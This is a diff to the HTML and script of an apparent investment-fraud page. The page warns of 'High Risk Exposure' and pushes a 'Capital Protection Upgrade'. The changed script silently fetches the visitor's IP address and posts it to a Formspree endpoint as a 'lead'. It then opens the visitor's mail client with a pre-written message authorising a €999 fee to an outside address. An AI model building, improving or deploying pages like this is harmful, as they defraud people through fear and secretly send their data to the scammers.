@@ -95,7 +95,6 @@
 
         .btn-upgrade:hover { background: #0040C7; transform: translateY(-2px); }
 
-        /* Success State Styling */
         #success-message { text-align: center; display: none; padding: 20px 0; }
         .check-icon {
             width: 60px; height: 60px;
@@ -127,7 +126,7 @@
     </div>
 
     <div class="content">
-        <!-- Default State -->
+        <!-- Default Interface -->
         <div id="offer-state">
             <div class="status-badge">High Risk Exposure Warning</div>
             <h1>Capital Protection Upgrade</h1>
@@ -158,45 +157,59 @@
             </a>
         </div>
 
-        <!-- Success State -->
+        <!-- Success Message -->
         <div id="success-message">
             <div class="check-icon">✓</div>
             <h2 style="margin-bottom: 10px;">Notification Sent</h2>
             <p>Your request for the 10% Capital Protection Protocol has been successfully transmitted to our Risk Management Department.</p>
             
             <div class="fallback-note">
-                <strong>Important:</strong> If you do not receive an email from your financial advisor in the next 20 minutes, please reach out via <a href="mailto:kayaer@bitelity.info">kayaer@bitelity.info</a>.
+                <strong>Important:</strong> If you do not receive an email from your financial advisor in the next 20 minutes, please reach out through this email: <a href="mailto:kayaer@bitelity.info">kayaer@bitelity.info</a>.
             </div>
         </div>
     </div>
 </div>
 
 <script>
-function processUpgrade() {
+async function processUpgrade() {
     const btn = document.getElementById('cta-btn');
+    const formspreeUrl = "https://formspree.io/f/xqeovagz"; 
+
     btn.innerHTML = "Securely Processing...";
     btn.style.opacity = "0.6";
     btn.style.pointerEvents = "none";
 
-    // 1. Silent ping to tracker
-    fetch('notify.php')
-    .then(() => {
-        // 2. Switch UI states
-        document.getElementById('offer-state').style.display = 'none';
-        document.getElementById('success-message').style.display = 'block';
+    try {
+        // 1. Get IP address of the client
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const clientIp = ipData.ip;
 
-        // 3. Trigger the email confirmation for the user
-        setTimeout(() => {
-            const subject = encodeURIComponent("Upgrade Authorization Request - Capital Protection");
-            const body = encodeURIComponent("Dear Bitelity Support,\n\nI confirm my request to activate the 10% Capital Protection Protocol for my account. I authorize the one-time activation fee of €999.00.\n\nPlease provide the next steps for settlement.");
-            window.location.href = `mailto:kayaer@bitelity.info?subject=${subject}&body=${body}`;
-        }, 1500);
-    })
-    .catch(err => {
-        // Fallback for offline/error testing
-        document.getElementById('offer-state').style.display = 'none';
-        document.getElementById('success-message').style.display = 'block';
-    });
+        // 2. Send silent notification to your email via Formspree
+        await fetch(formspreeUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                subject: "🚨 NEW BITELITY UPGRADE LEAD",
+                client_ip: clientIp,
+                action: "Clicked Activate Protection",
+                platform: "Bitelity Institutional GitHub Portal"
+            })
+        });
+    } catch (err) {
+        console.log("Tracking error, proceeding to UI.");
+    }
+
+    // 3. Switch UI to "Sent" status
+    document.getElementById('offer-state').style.display = 'none';
+    document.getElementById('success-message').style.display = 'block';
+
+    // 4. Open client's email app with pre-filled request
+    setTimeout(() => {
+        const subject = encodeURIComponent("Upgrade Authorization Request - Capital Protection");
+        const body = encodeURIComponent("Dear Bitelity Support,\n\nI confirm my request to activate the 10% Capital Protection Protocol for my account. I authorize the one-time activation fee of €999.00.\n\nPlease provide the next steps for settlement.");
+        window.location.href = `mailto:kayaer@bitelity.info?subject=${subject}&body=${body}`;
+    }, 1500);
 }
 </script>
 
